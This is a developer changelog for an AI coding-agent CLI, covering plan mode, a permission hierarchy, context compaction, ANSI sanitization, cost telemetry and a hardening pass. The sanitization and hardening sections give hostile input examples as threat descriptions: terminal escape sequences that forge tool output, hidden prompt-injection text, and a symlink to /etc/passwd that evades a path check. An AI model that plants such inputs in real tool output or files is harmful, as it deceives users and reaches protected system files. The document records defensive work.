  to verify; until then the harness is "ready, not yet
  measured." That measurement is the actual M2 sign-off.
- M3 starts after the baseline: subagents + worktree + MCP +
  resume + checkpoints + `/undo` + `bash_background` +
  `todo_write` + Repo Map.

---

## [2026-04-28] M2 / Step 5 — Plan mode (`--plan`)

`AGENTIC_CLI §5` calls plan mode "blocked at the harness level, not
in policy" — a read-only profile where the model produces a
structured plan instead of applying changes. Step 5 ships the
one-shot CLI version. Interactive `[a]ccept/[e]dit/[r]eject` review
flow needs the Ink UI and is deferred per the spec's plan→execute
section.

**Done:**
- `src/cli/args.ts` — `--plan` flag parsed alongside `--json`/etc.
  `ParsedArgs.plan: boolean` (default false). Usage line lists the
  flag.
- `src/harness/types.ts` — `HarnessConfig.planMode?: boolean`.
- `src/harness/invoke-tool.ts` — `InvokeToolDeps.planMode?: boolean`.
  When true and the resolved tool has `metadata.writes === true`,
  the call short-circuits BEFORE the permission engine and BEFORE
  any DB write. Returns a synthetic deny tool_result with a clear
  read-only message; no `tool_call` row, no `approval` row, no
  `execute()` invocation. Plan mode runs at the harness layer so
  even a session-policy override that allows writes can't subvert
  the read-only profile (spec invariant).
- `src/harness/loop.ts` — propagates `config.planMode` into
  `invokeTool` deps.
- `src/cli/bootstrap.ts` — `BootstrapInput.plan?: boolean`. When
  true, sets `config.planMode = true` AND injects
  `PLAN_MODE_SYSTEM_PROMPT` (markdown structure: Goal/Scope/Steps/
  Risks/Assumptions). Subset of the spec's full YAML schema —
  schema-validated output is M5+ when constrained generation lands.
- `src/cli/run.ts` — wires `args.plan` → `BootstrapInput.plan`.
  Prints `[plan mode] read-only run; write tools are blocked at the
  harness` to errSink before the run starts.

**Decisions:**
- **Harness-level block, not session-policy injection.** I considered
  injecting a session-layer policy with `deny_paths: ['**']` +
  `locked: true` for write tools — would reuse Step 4's lock
  semantics and feel cleaner. Rejected: (a) plan mode is profile,
  not policy — confusing two concepts undermines both; (b) spec is
  explicit ("blocked at the harness level, not policy"); (c) policy
  block has more moving parts (tool→category→section lookup) than a
  single `metadata.writes` check, more surface for the read-only
  invariant to drift; (d) harness-level block reads as `metadata.writes`
  — same predicate the checkpoint subsystem will use in M3 — keeping
  the concept centralized.
- **System prompt is markdown, not YAML schema.** Spec §5.1 lists
  the formal YAML schema for plan output. Without constrained
  generation (`generateConstrained` is M5), asking the model for
  YAML and parsing it loosely would produce occasional malformed
  output that callers couldn't reliably consume. Markdown is what
  the model produces naturally and the user can read directly;
  the YAML schema is an upgrade for when the constrained backend
  ships.
- **No interactive review.** Plan mode in M2 ends with the markdown
  on stdout (or NDJSON `text_delta` events) and exits. The spec's
  `[a]ccept/[e]dit/[r]eject` modal needs Ink components and a
  re-enter-run flow — both M3+. Single-shot plan still useful by
  itself: dirigir the CLI in big repos with confidence the run
  won't apply anything.
- **Plan-aware system prompt at bootstrap, not in the loop.**
  Bootstrap is where flag → config conversion happens; injecting
  there keeps the loop ignorant of plan mode beyond the
  `planMode` flag pass-through. Loop only consults the flag at
  the invokeTool propagation site.
- **Indicator on stderr regardless of `--json`.** Per spec §2.2,
  stdout in `--json` mode is NDJSON only; the plan-mode marker is
  operational metadata, not run output, so it goes to stderr where
  it doesn't pollute downstream pipes.
- **Per-tool `metadata.writes` is the source of truth.** Tools
  declare `writes: true` in their metadata (already the case for
  `write_file`, `edit_file`, `bash`). Plan mode reads from there;
  no parallel "list of write tools" to keep in sync.

**Tools with `writes: true` (blocked in plan mode):** `write_file`,
`edit_file`, `bash` (declared writes-true pessimistically per
CONTRACTS §2.6.3). Read-only tools (`read_file`, `glob`, `grep`)
proceed through the normal allow path.

**New tests (+10 over Step 4):**
- `tests/cli/args.test.ts` — 2: `--plan` flag set, default false.
  Usage line mentions `--plan`.
- `tests/cli/bootstrap.test.ts` — 2: plan:true → planMode + system
  prompt; plan omitted → both unset.
- `tests/cli/run.test.ts` — 1: `[plan mode]` indicator on errSink.
- `tests/harness/invoke-tool.test.ts` — 2: write tool denied
  before policy + DB (no execute, no toolCallId); read-only tool
  still executes normally in plan mode.
- `tests/harness/loop.test.ts` — 1: end-to-end runAgent with
  planMode + permissive policy + write tool_use → denied at
  harness, decision.kind === 'deny', execute never called.
- Total suite: **548 pass / 7 skip / 1215 expect() calls** in ~1.6s.

**Out of scope (deferred):**
- Interactive `<PlanReview>` modal with `[a]ccept/[e]dit/[r]eject` —
  M3 (needs Ink).
- Plan → run reentry with structured goal injection — M3.
- Schema-validated YAML output (`spec §5.1` formal schema) — M5
  (constrained generation backend).
- Plan-as-artifact persistence (`.agent/plans/<timestamp>.md`) —
  deferred; current model output goes to stdout, captured if user
  redirects.
- `acceptEdits` profile (third profile in §5.1) — separate step.
  acceptEdits is policy-mode (`PolicyMode.acceptEdits`) and already
  exists in the engine; CLI flag would just inject a session policy.

**Pending:** none for this step.

**Next:** M2 / Step 6 — Eval smoke. Final canonical M2 item per
spec §18. Minimal eval harness: 5-10 fixed tasks, executor that
runs `runAgent` against a real model, measures pass-rate + p50
cost. Critério de saída: pass-rate ≥85% smoke, p50 < $0.20/task.
Without it the rest of M2 is asserted-to-work without proof.

---

## [2026-04-28] M2 / Step 4 — Permission hierarchy

`AGENTIC_CLI §8` requires layered policy resolution: enterprise →
user → project → session. M1 only loaded `./.agent/permissions.yaml`,
leaving the higher and lower precedence tiers stubbed. Step 4 closes
that gap; trust prompt (the other half of M2 step 4 in the spec) is
deferred to `docs/TODO.md` because it depends on interactive UI that
hasn't landed yet.

**Done:**
- `src/permissions/paths.ts` — path discovery for each layer.
  `ENTERPRISE_POLICY_PATH = /etc/agent/permissions.yaml`. User path
  honors `XDG_CONFIG_HOME` (with empty-string fallback to
  `~/.config/agent/permissions.yaml`). Project path stays
  `cwd/.agent/permissions.yaml`.
- `src/permissions/hierarchy.ts` — `resolvePolicy({cwd, ...})` walks
  the four layers, loads each that exists, merges with locked-section
  semantics. Returns the effective `Policy`, the loaded
  `LayerPolicy[]` trail, and a `LockConflict[]` array describing any
  override attempts that were rejected.
- `src/permissions/types.ts` — added `locked?: boolean` to
  `PolicyDefaults`, `BashPolicy`, `PathPolicy`, `FetchPolicy`. Validator
  accepts and rejects non-boolean values.
- `src/permissions/config.ts` — `parsePolicy` round-trips `locked` on
  defaults and on each tool section.
- `src/cli/bootstrap.ts` — replaces the single-file `loadPolicyFromFile`
  call with `resolvePolicy`. New `BootstrapResult` shape: `policyLayers`
  (array of which layers contributed) + `lockConflicts` (warnings to
  surface). Test seams `enterprisePolicyPath`/`userPolicyPath` accept
  `null` to disable a layer entirely (avoid touching `/etc` in tests).
- `docs/TODO.md` — trust prompt deferral with rationale and pull-in
  signal.

**Merge semantics:**
- **Replace, not extend.** A lower-precedence layer that defines
  `tools.bash` fully replaces the higher layer's `tools.bash`.
  Predictable + matches most config systems; users who want to extend
  re-list everything. Spec stayed silent on this; replace is the safer
  choice for security policy (no surprise merges that allow more than
  the user intended).
- **Locked sections drop overrides + record conflicts.** Once any
  layer marks a section as `locked: true`, subsequent layers'
  attempts to redefine that section are silently dropped from the
  merged result and recorded in `lockConflicts` with
  `{section, lockedBy, attemptedBy}`. Caller (CLI run.ts) prints
  conflicts as warnings to stderr.
- **Same-value isn't a conflict.** A lower layer setting
  `defaults.mode: strict` when enterprise locked mode at `strict` is
  silently OK — only differing values trip the conflict log.

**New tests (+15 over Step 3):**
- `tests/permissions/paths.test.ts` — 5 cases: enterprise constant,
  XDG honored, XDG-empty falls back, ~/.config fallback, project path.
- `tests/permissions/hierarchy.test.ts` — 10 cases: discovery (no
  files, project only, three-layer precedence, session override),
  locked semantics (enterprise blocks user, enterprise blocks project,
  user blocks project, multi-layer conflict log, non-locked replace,
  same-value non-conflict).
- `tests/cli/bootstrap.test.ts` — updated to use `policyLayers`
  instead of removed `policySource` field; `enterprisePolicyPath: null`
  + `userPolicyPath: null` test seams pin that the test suite never
  touches `/etc/agent` or `~/.config/agent` during run.
- Total suite: **512 pass / 7 skip / 1132 expect() calls** in ~1.5s.

**Decisions:**
- **`enterprisePath: null` and `userPath: null` as test seams** rather
  than relying on `existsSync` returning false. Tests that don't
  actively use a layer set the path to `null` so the layer is
  guaranteed not to be probed. Catches the class of test bugs where
  a CI runner happens to have `/etc/agent/permissions.yaml` and the
  test silently picks it up.
- **`Policy` type ships `locked` as part of the schema**, not as a
  separate per-layer flag map. Round-trips through YAML; admins can
  inspect any layer's `locked` directly in the file without consulting
  a separate manifest.
- **All four layers use the same lock semantics**, not "only
  enterprise can lock". Spec language is "enterprise pode marcar
  regras como locked" (can mark) — doesn't preclude others. Uniform
  semantics are simpler and let user/project lock things from session
  too (think: a project locks its `tools.write_file.deny_paths`
  against runtime `--allow-write-everywhere` flags later).
- **`session` layer threads through `ResolveOptions.session`** rather
  than reading a separate config file. Session-layer config in M1 is
  only injected via tests / harness wiring; CLI flags adding to it is
  Step 5+ work.
- **`policyLayers` returns `('enterprise'|'user'|'project'|'session')[]`**
  instead of the old single `policySource: 'project'|'default'` enum.
  Multi-layer is now the norm; an empty array signals "no layer file
  found anywhere — engine falls back to default strict policy".

**Out of scope:**
- Trust prompt (deferred — see `docs/TODO.md`).
- `agent perms` introspection subcommand (would render `layers` and
  `lockConflicts` for the user). Cosmetic, lands when slash commands
  arrive in M3.
- CLI flag → session policy threading (`--allow`, `--deny`, etc).
  Session layer accepts injected policy today; binding flags to it
  is a later step.
- Windows path discovery (`%PROGRAMDATA%`, `%APPDATA%`). Linux/Mac
  only in M1/M2; same posture as `src/storage/paths.ts`.
- Multi-file policy in a layer (e.g., `~/.config/agent/permissions.d/*.yaml`).
  Single file per layer for now; conf.d-style fragments deferred.

**Pending:** none for this step.

**Next:** M2 / Step 5 — Plan mode (`--plan`). Read-only profile that
short-circuits all `writes: true` tools, asks the model to produce a
plan in markdown, exits without applying. Reuses the permissions
engine: a session-layer policy with `bypass`-style read tools and
deny-all writes. Useful for dirigirthe CLI in big repos with
confidence.

---

## [2026-04-28] M2 / Step 3 — Compaction

`AGENTIC_CLI.md §6` and `ORCHESTRATION.md §4` require the harness to
shrink conversation history when the prompt approaches the model's
context window. M1 sent the full history every turn; long sessions
would either burn cache hits or hit the cap. Step 1's telemetry
provides the trigger signal (per-turn prompt token count); Step 3
spends it.

**Done:**
- `src/harness/compaction.ts` — `compactMessages(provider, messages, options)`
  rewrites a `ProviderMessage[]` keeping the first user message
  (goal) and the last K turns literal, summarizing everything in
  between via an LLM call. Falls back to deterministic elision (drop
  `tool_result` bodies, replace with `[tool_result elided: N bytes]`
  pointers) when the LLM call fails. `temperature: 0` on the summary
  call so the same input compacts the same way across reruns.
- `src/harness/types.ts` — `RunBudget.compactionThreshold` (default
  `0.7`) and `compactionPreserveTail` (default `3`) per spec
  §4.1/§4.6. New `HarnessEvent` kinds `compaction_started` and
  `compaction_finished` carry threshold, prompt tokens, strategy
  (`'llm' | 'fallback' | 'skipped'`), folded count, duration, and
  reason. JSON renderer carries them through NDJSON automatically.
- `src/harness/loop.ts` — trigger check at the bottom of each loop
  iteration (after tool_results push, before the next request). Uses
  the LAST turn's `usage.input + cache_read + cache_creation` as a
  proxy for "size of the next request" — free signal, no extra
  countTokens HTTP call. Skips when telemetry was unavailable for
  the turn (`usageSeen=false`) since a guess could be very wrong.
  In-place rewrites the running `messages` array; the SQLite
  `messages` table stays intact so audit / replay can re-derive a
  different compaction policy later.
- Synthetic summary message uses `assistant` role with explicit
  `[compacted_history] ... [/compacted_history]` markers. Wrapper
  re-adds markers if the model forgets them so downstream scanners
  (recap, audit) can locate compacted blocks unambiguously.
- Fallback path emits a synthetic note describing strategy + reason,
  followed by the original middle messages with `tool_result` bodies
  elided. Pointer string includes original byte size and points to
  the audit log so a forensics user can recover the body.

**New tests (+11 over Step 2):**
- `tests/harness/compaction.test.ts` — 8 cases:
  - LLM happy path: goal + tail preserved, middle replaced with one
    summary message.
  - Marker re-injection when the model returns prose without them.
  - Summary request shape: `temperature: 0`, configurable `maxTokens`,
    compaction system prompt instead of the run's.
  - History too short → `strategy: 'skipped'`, no provider call.
  - LLM throw → `strategy: 'fallback'`, original middle preserved
    with `tool_result` content elided.
  - Stream-only errors → fallback (no useful summary).
  - Empty summary text → fallback.
  - Aborted signal → fallback (the abort reaches the LLM call via
    `abortableIterable`).
- `tests/harness/loop.test.ts` — 3 cases:
  - Trigger fires when `prompt_tokens > threshold × context_window`;
    `compaction_started` and `compaction_finished` events emit;
    post-compaction request reaches the provider with shorter
    `messages.length`.
  - Below threshold → no event.
  - `usageSeen=false` → no event (can't guess size honestly).
- Total suite: **459 pass / 7 skip / 1016 expect() calls** in ~1.5s.

**Decisions:**
- **Trigger signal is the LAST turn's billed prompt tokens**, not a
  pre-flight `countTokens` call. `countTokens` would be a free-cost
  HTTP roundtrip on Anthropic and a heuristic on OpenAI; reusing
  telemetry already collected is exact (for the request that just
  ran) and zero-cost. The next request is "this history + freshly
  appended tool_results" — strictly larger than what we measured —
  so a turn ≥70% guarantees the next ≥70%. Slightly eager but
  always correct in the safe direction (trigger before we hit the
  cap, never after).
- **Skip when `usageSeen=false`.** Compat endpoints that drop usage
  telemetry leave us blind to the actual prompt size. Guessing
  (chars/4 heuristic over the messages) could be wildly off and
  trigger needless compactions. The conservative call is to skip;
  the user's `~$X.XX (incomplete)` cost indicator already signals
  the missing telemetry.
- **In-memory only — no DB rewrite.** `messages` table keeps every
  original turn. Compaction only mutates the running provider array.
  Replay can re-decide whether to compact or take the long path.
  Avoids an "atomic mid-session DB rewrite" mechanism that would
  multiply the test surface for marginal gain in M2.
- **Same provider as the run for the summary call.** Spec §4.5
  recommends a cheaper model per profile (Haiku for autonomous
  Anthropic). Selecting the cheap model requires a registry-aware
  policy that we'll add when we have profile abstractions in M3+.
  For now, using the run's provider keeps the integration tight
  and lets users override via the registry.
- **Summary inserted as `assistant` role, not `user`.** Two
  consecutive `user` messages would also be valid (Anthropic accepts),
  but presenting the summary as the agent's own context note keeps
  the next turn's user/assistant alternation obvious to the model
  reading the prompt.
- **Fallback preserves the middle messages with elided
  `tool_result` content** rather than collapsing to a single note.
  Tool_use blocks reference IDs the next turn might still cite;
  preserving the structure (with bodies replaced by pointers) keeps
  those references resolvable. Pointer carries original byte size
  so a verbose-mode user knows the magnitude of what was dropped.
- **Marker re-injection on missing markers.** Tests pin that the
  wrapper re-adds `[compacted_history]...[/compacted_history]` when
  the model forgets — drift in the model's structured-output
  adherence shouldn't break downstream scanners.

**Out of scope (deferred):**
- `PreCompact` hook — requires hooks subsystem (M4).
- Pinned context (`CONTEXT_TUNING.md §12.4`) — needs the slash
  command surface and the user-facing pin/unpin UX.
- Goal re-injection literal (`§4.2 step "Goal re-injection literal +
  pinned context"`) — currently the goal IS preserved as message[0]
  but isn't re-injected into the system prompt. Lands when system
  prompt architecture (`CONTEXT_TUNING.md §1`) is implemented.
- Schema-validated compaction output with retry — depends on
  constrained generation backend (M5) for reliable structured
  decoding. Current loose-text approach is acceptable while we
  monitor adherence in eval.
- Per-profile cheap-model selection (`§4.5`) — requires profile +
  model-registry policy plumbing (M3+).
- DB persistence of compaction events / `compaction_runs` table —
  current `onEvent` callback is enough for M2 observability;
  formal audit table lands with the rest of the audit subsystem.
- Atomic SQLite transaction around compaction — only relevant when
  we DO persist the rewrite (deferred above).
- `evals/compaction/static_fallback/` corpus — bound to the evals
  smoke step.
- Truncation tier (oldest assistant turns head+tail) when fallback
  is still > threshold (`§4.6` step 6) — current fallback drops
  bodies; size-bounded follow-up is M2 later step.

**Pending:** none for this step.

**Next:** M2 / Step 4 — Trust prompt + permission hierarchy. New
directory / unknown `AGENTS.md` requires confirmation; merge
enterprise → user → project → session policy resolution. Fixes a
gap from M1 where `./.agent/permissions.yaml` was the only source.

---

## [2026-04-28] M2 / Step 2 — Output sanitization (ANSI strip)

`SECURITY_GUIDELINE.md §3.2` (line 161) and §5 invariant 4 require a
sanitization layer between tool execution and the model context. M1
left the gap explicit; Step 2 closes it.

**Threat covered:**
- A tool returning `\x1b[2K\x1b[1AOK: file empty` lets a malicious
  file lie about what happened when its output is later echoed in a
  terminal (verbose mode, audit replay, recap renderer).
- Tools embedding OSC sequences (`\x1b]0;title\x07`) can hijack the
  terminal title or, with OSC 8, inject deceptive hyperlinks.
- Token waste: ANSI bytes in the model's context inflate input cost
  with bytes the model can't render.
- Prompt-injection vector: text hidden inside escape blocks.

**Done:**
- `src/sanitize/ansi.ts` — `stripAnsi(s)` removes CSI (`\x1b[...`),
  OSC with both BEL and ST terminators, DCS/APC/PM/SOS, 7-bit
  single-char escapes (range 0x40-0x7E covering Type Fe + Fs + RIS),
  and 8-bit C1 controls (0x80-0x9F). Alternation order matches
  structured patterns first, so a malformed `\x1b[123;` falls
  through to the single-char rule (eats just `\x1b[`, leaves `123;`
  as text — leaving live ESC bytes is the security risk).
- `src/sanitize/ansi.ts` — `sanitizeToolOutput(value)` recursively
  walks objects and arrays, stripping ANSI from every string leaf
  while preserving shape, primitives, and discriminator booleans
  (`is_error: true` on `ToolError` survives intact). Cycle detection
  via `WeakSet` replaces revisited references with `<cycle>`; tool
  outputs shouldn't contain cycles, but a buggy input must not
  stack-overflow.
- `src/harness/invoke-tool.ts` — sanitizes the tool result once,
  before both sinks: the audit row (`finishToolCall(... output ...)`)
  and the model-facing `tool_result` block. ToolError messages also
  pass through (a subprocess crashing with colored stderr won't
  smuggle escape bytes into either path).

**New tests (+18 over Step 1):**
- `tests/sanitize/ansi.test.ts` — 12 cases: SGR colors, cursor/erase
  (the canonical "rewrite history" pattern), OSC with both
  terminator styles, DCS/APC, single-char escapes, C1 bytes,
  preservation of plain text and whitespace, malformed CSI handling,
  consecutive sequences. Plus 9 `sanitizeToolOutput` cases: nested
  walk, non-string preservation, cyclic objects, cyclic arrays,
  ToolError discriminator, no-mutation guarantee.
- `tests/harness/invoke-tool.test.ts` — 2 new: ANSI stripped from
  both `tool_result.content` and persisted `tool_calls.output`;
  ANSI in `ToolError.error_message` also stripped. Hard guarantee:
  `JSON.stringify(tc?.output)` contains no `\x1b` byte.
- Total suite: **444 pass / 7 skip / 959 expect() calls** in ~1.4s.

**Decisions:**
- **Sanitize at the harness, not the tool layer.** Universal policy
  beats per-tool opt-in: no future tool can forget to strip. The
  sanitizer runs once and feeds both the audit row and the
  `tool_result` block, so neither path can drift.
- **Strip everything, don't preserve SGR.** The spec language
  ("preservar SGR seguro") targets terminal renderers. For tool
  output flowing to the MODEL there's no terminal — colors are
  noise. A future verbose/interactive renderer that wants to display
  tool output to the user can re-decide at its own layer with its
  own safe-SGR allowlist (renderer side, against text we already
  scrubbed at intake).
- **Recursive walker, not flat string strip.** Tools return
  structured objects (`{stdout, stderr, exit_code}`). Walking
  preserves shape so the model gets `{stdout: "error: real", ...}`
  instead of a re-stringified blob.
- **Cycle marker is `<cycle>`** rather than throwing or silently
  dropping the branch. Tool contract is JSON-shaped (no cycles in
  practice), but a buggy input mustn't stack-overflow; the marker
  keeps the path navigable.
- **Malformed CSI strips just `\x1b[`** instead of leaving the ESC
  byte. The conservative direction is "remove control bytes
  aggressively, leave printable text alone" — orphan params (`123;`)
  in output are harmless noise; live ESC bytes are the security risk.
- **No `--include-tool-output` raw escape hatch yet.** Spec §1.4
  mentions one for future verbose mode. Deferred until M2 has a
  verbose-output path that needs it; the audit row will hold raw
  bytes only when explicitly opted in (and re-stripped before
  re-display).
- **`stripAnsi` keeps `\t \n \r`.** Whitespace bytes are part of
  legitimate text content; only escape sequences are control bytes
  for sanitization purposes.

**Out of scope:**
- Renderer-side SGR allowlist for verbose mode (M2 later step or M3)
- Secret redaction (`SECURITY_GUIDELINE.md §6` — separate layer)
- Injection heuristic with `injection_suspect: true` flag
  (`SECURITY_GUIDELINE.md §9.1.5` — bound to `fetch_url` policy work)
- Real-shell ANSI fixture corpus from `evals/` (deferred to evals
  smoke step)

**Pending:** none for this step.

**Next:** M2 / Step 3 — Compaction. Sliding-window history +
Haiku-driven summarization when context approaches the model's cap.
The Step 1 telemetry tells the harness when to trigger; this step
spends those numbers.

---

## [2026-04-28] M2 / Step 1 — Telemetry: usage tokens + cost tracking

Opens M2 ("Robustez"). Pre-requisite for compaction (need to know when to
trigger) and eval smoke (need cost numbers). Without it, the CLI is flying
blind on production runs.

**Done:**
- `src/providers/types.ts` — new `UsageInfo` (`input` / `output` / `cache_read` / `cache_creation`) and a canonical `kind: 'usage'` `StreamEvent` between the last content event and `stop` in every well-formed turn.
- `src/providers/anthropic/stream.ts` — extracts usage from `message_start.message.usage` (input + cache_read + cache_creation) and from the final `message_delta.usage` (output). Both shapes optional in `RawAnthropicEvent` so older SDK responses still parse. Defaults to zero when the SDK omits it.
- `src/providers/openai/stream.ts` — reads `chunk.usage` from the final chunk (only present when `stream_options.include_usage` is set). Splits `prompt_tokens` minus `prompt_tokens_details.cached_tokens` so `input` semantics match Anthropic (non-cached tokens at full rate, cache_read at the discount tier).
- `src/providers/openai/index.ts` — opts into `stream_options: { include_usage: true }` on every `chat.completions.create`. Falls back to a zeroed UsageInfo when compatibility endpoints (Azure, OpenRouter) ignore the flag.
- `src/providers/google/stream.ts` — reads `chunk.usageMetadata` (cumulative; last chunk wins). Same `prompt − cached` split. `cache_creation` stays zero (Gemini's cache is pre-warmed via a separate API; the stream never reports writes).
- `src/providers/cost.ts` — `computeCost(caps, usage)` honors the four-tier rate table (`input`, `output`, `cache_read`, `cache_creation`); falls back to the raw input rate when `cost_per_1k_cached_input` or `cost_per_1k_cache_write` aren't declared. `addUsage` + `emptyUsage` for accumulation.
- `src/storage/migrations/003-usage-cost.ts` — `ALTER TABLE messages ADD COLUMN cache_creation_tokens INTEGER` + `ADD COLUMN cost_usd REAL`. The original schema had `cached_tokens` (reads) but no separate write column; cost_usd avoids re-deriving pricing every time `agent audit costs` runs.
- `src/storage/repos/messages.ts` — `Message` carries `cacheCreationTokens` / `costUsd`; `appendMessage` accepts and persists them.
- `src/harness/collect.ts` — `CollectedStep.usage` accumulated from `kind: 'usage'` events. Last event wins (defensive for adapters that ever split the report).
- `src/harness/loop.ts` — every assistant turn writes `tokens_in` / `tokens_out` / `cached_tokens` / `cache_creation_tokens` / `cost_usd` to `messages`. Session-wide totals (`totalUsage`, `totalCostUsd`) accumulate across turns, persist via `completeSession(..., totalCostUsd)` (the column already existed but was always written as `0`), and surface in `HarnessResult.usage` + `HarnessResult.costUsd`.
- `src/harness/types.ts` — `HarnessResult` exposes `usage: UsageInfo` and `costUsd: number`. `session_finished` HarnessEvent reuses `result`, so renderers see the totals without a new event shape.
- `src/cli/output/plain.ts` — final summary line now reads `[done/done] N steps · Mms · tokens IN/OUT[ (cache_r X, cache_w Y)] · $0.XXXX`. Cache columns elided when zero so OpenAI/Gemini users don't get noise.
- `src/cli/output/json.ts` — unchanged; passes `session_finished` through and `result.usage` / `result.costUsd` ride along automatically. New test pins the NDJSON shape.

**New tests (+62 over M1):**
- `tests/providers/cost.test.ts` — 9 cases: empty usage, input/output composition, cached_input rate honored, fallback to input rate when cached_input undeclared, cache_write rate honored, fallback for cache_creation, all-four composition, addUsage commutativity.
- `tests/providers/anthropic-stream.test.ts` — 2 new: usage extracted from message_start + message_delta with cache splits; zeroed usage event when SDK omits the payload.
- `tests/providers/openai-stream.test.ts` — 1 new: cached_tokens split out of prompt_tokens (matches Anthropic semantics).
- `tests/providers/google-stream.test.ts` — 1 new: cachedContentTokenCount split out of promptTokenCount.
- `tests/harness/loop.test.ts` — 3 new: aggregates usage across turns + persists to `sessions.total_cost_usd`; per-message tokens + cost on assistant rows; `session_finished` event carries the same usage/cost as the result.
- `tests/cli/output-plain.test.ts` — 1 new: summary shows cache columns when non-zero; existing summary tests updated to assert `tokens N/M` + `$0.XXXX`.
- `tests/cli/output-json.test.ts` — assert NDJSON `session_finished` line contains `result.usage.input` and `result.costUsd`.
- All 3 stream test files gained a `collectNonUsage` helper so the existing exact-sequence assertions (~30 tests) didn't need a `usage` event boilerplate — only the dedicated usage tests use raw `collect`.
- Total suite: **396 pass / 7 skip / 867 expect() calls** in ~1.4s.

**Decisions:**
- **`usage` is its own canonical `StreamEvent` kind**, not a field tacked onto `stop`. Adapters emit it once per turn between the last content event and `stop`; `collectStep` accumulates it independently. Tying usage to `stop` would force every test that asserts a `stop` shape to know about usage; making it its own event lets renderers / collectors choose to ignore it.
- **`prompt_tokens − cached_tokens` split for OpenAI/Gemini** at the adapter, not the cost computer. OpenAI's `prompt_tokens` is the *full* prompt count including cache hits; Anthropic's `input_tokens` is *non-cached only*. Normalizing to Anthropic's semantics here means `computeCost` doesn't need a per-provider branch — it just multiplies by the declared rate.
- **`cost_per_1k_cached_input` / `cost_per_1k_cache_write` fall through to `cost_per_1k_input`** when undeclared. Charging the raw input rate is loud failure — overcounts vs. the discount tier rather than undercounting silently to zero. A model entry that forgets to declare cache rates will show inflated cost and surface the gap in `agent audit costs`.
- **OpenAI provider opts into `stream_options.include_usage` unconditionally.** Without the flag, the final chunk has no `usage` field. A handful of compatibility endpoints (early Azure, some OpenRouter setups) ignore it; the normalizer falls back to a zeroed UsageInfo so the harness still sees a usage event and `costUsd` reads as 0 instead of crashing.
- **Storage migration is additive (`ALTER TABLE` for two columns).** Reusing existing `messages.tokens_in/tokens_out/cached_tokens` rather than introducing a parallel `usage_events` table — keeps queries ergonomic (`SELECT cost_usd FROM messages WHERE session_id = ?`). Per-message `cost_usd` redundant with `tokens × pricing` but stored anyway because `audit costs --by tool` (spec §1) shouldn't have to re-derive pricing every query.
- **Mock provider in tests gains `capsOverride`** for cost-bearing tests (`cost_per_1k_input: 0` was the default; that hides cost bugs). Existing tests stay zero-cost.
- **`collectNonUsage` helper** in stream tests instead of updating ~30 inline arrays. The tests are pinning canonical event order; usage arriving as a new event would force boilerplate without testing anything different. Dedicated usage tests use raw `collect`.

**Out of scope (still M2+):**
- `agent audit costs --by tool / --by session` CLI subcommands (spec §1) — needs M2 Step on session listing/inspection
- Compaction (next Step — uses these usage numbers to decide trigger threshold)
- Cache breakpoint hints to the provider (CONTEXT_TUNING)
- Real-network test fixtures for usage extraction (deferred to evals)
- `agent stats --tokens` discrepancy detector (TOKEN_TUNING §8.3) — needs local tokenizer (M5)
- Honest pricing values in capabilities — they're still illustrative per `PROVIDERS.md §5`; dynamic pricing config deferred

**Code-review fixes folded in before commit:**
- **Anthropic cache_write rates declared explicitly.** All three Anthropic models (`opus-4-7`, `sonnet-4-6`, `haiku-4-5`) now carry `cost_per_1k_cache_write` at 1.25× their input rate per Anthropic's public pricing. Before this fix, `computeCost` fell back to the raw input rate for cache-creation tokens, undercounting Anthropic cache-write turns by 25%. The first review pass mislabeled the fallback as "overcount" — it was the opposite direction.
- **`computeCost` docstring rewrites the cache-fallback decision honestly.** Says "undercounts on Anthropic, declare the rate explicitly" instead of the original "overcounts slightly" claim.
- **OpenAI `stream_options.include_usage` is opt-out via `CreateOpenAIProviderOptions.includeUsage`.** Some compat endpoints (older Azure deployments, certain proxies) reject unknown params with HTTP 400; the option lets users disable telemetry rather than fail the run. Default stays `true`. Two new tests pin both branches: that the param is forwarded by default, and that `includeUsage: false` omits it.
- **`mergeUsage` (Anthropic adapter) uses `Math.max` instead of overwrite.** Today's SDK reports cumulative; if a future shift to incremental deltas (or interim partial counts) ever happens, the largest-seen value wins instead of a smaller late event silently shrinking totals. Regression test pins it.
- **OpenAI normalizer extracts usage AFTER emitting `start`.** Reading `chunk.usage` first was harmless today (the usage-only chunk has empty choices and falls through), but the canonical contract is "start-first"; reordering keeps the invariant.
- **Harness writes NULL token/cost columns when no `usage` event was seen.** New `usageSeen` flag on `CollectedStep` flips `true` only when an actual `kind: 'usage'` event arrived. Lets downstream analytics (`agent audit costs`) tell "adapter never reported" from "turn measured zero". Three new collect.test.ts cases cover the flag transitions; loop test asserts NULL persistence.
- **`formatCost` is magnitude-aware.** Sub-$1 keeps 4 decimals (real billing precision matters there); $1–$100 uses 3; $100+ uses 2. Long sessions no longer print `$50.0000`-style cosmetic noise. Test sweeps three ranges.
- **`collectNonUsage` consolidated** into `tests/providers/_stream-helpers.ts` instead of duplicated across 3 files. Imported by all stream tests.
- **Migration 003 carries a note** that `cost_usd` is intentionally a write-time snapshot, not a recomputable derivation — historical rows preserve the rate the user was actually billed at, even if pricing config drifts later.

**Pending:** none for this step.

**Next:** M2 / Step 2 — Output sanitization (CSI escape stripping in `bash` / `read_file` / `grep` outputs before content reaches the model). Small, isolated, closes a security gap from M1. After that, compaction.

---

## [2026-04-27] M1 / Step 7 — Hardening pass

Addresses the 10-issue review of M1: real reliability/security gaps caught
before shipping. Each fix has a regression test where unit-testable.

**Done:**
- `src/storage/json-safe.ts` — `parseJsonSafe(raw, context)` + `StorageJsonError`. `messages.fromRow` and `tool_calls.fromRow` route through it so a tampered DB surfaces a typed error instead of a bare `SyntaxError` from `JSON.parse`.
- `src/permissions/matcher.ts` — `matchPath` now realpath-resolves the target before matching. A symlink at `src/link → /etc/passwd` no longer matches the `src/**` pattern (the matcher sees `/etc/passwd` and falls out via the cwd-anchored fallback). Two regression tests cover symlink-on-file and symlink-on-directory; one pins that non-existent paths (write_file new file) still match via parent realpath.
- `src/harness/invoke-tool.ts` — the tool_call setup (`createToolCall` + `recordApproval` + `startToolCall`/`finishToolCall`) is now wrapped in `withTransaction`. A crash between those statements no longer leaves orphan rows or stuck-pending status with a "should be denied" approval.
- `src/harness/loop.ts` — entire loop body wrapped in `try { ... } catch (e) { return guardedFinish(e) }`. SQLite errors from `appendMessage`/etc. now produce a clean `error/providerError` exit instead of crashing the caller.
